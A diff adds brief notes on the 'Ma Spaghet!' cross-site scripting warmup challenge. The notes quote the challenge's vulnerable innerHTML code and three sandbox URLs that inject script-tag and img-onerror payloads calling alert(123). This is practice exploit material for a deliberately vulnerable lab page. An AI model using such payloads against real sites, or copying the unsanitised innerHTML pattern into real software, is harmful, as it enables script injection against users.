@@ -1,0 +1,11 @@
+Ma Spaghet!
+
+<!-- Challenge -->
+<h2 id="spaghet"></h2>
+<script>
+    spaghet.innerHTML = (new URL(location).searchParams.get('somebody') || "Somebody") + " Toucha Ma Spaghet!"
+</script>
+
+https://sandbox.pwnfunction.com/warmups/ma-spaghet.html?somebody=<script>alert(123)</script>
+https://sandbox.pwnfunction.com/warmups/ma-spaghet.html?somebody=<img src="x" onerror="alert(123)">
+https://sandbox.pwnfunction.com/warmups/ma-spaghet.html?somebody=<img src='x' onerror='alert(123)'>
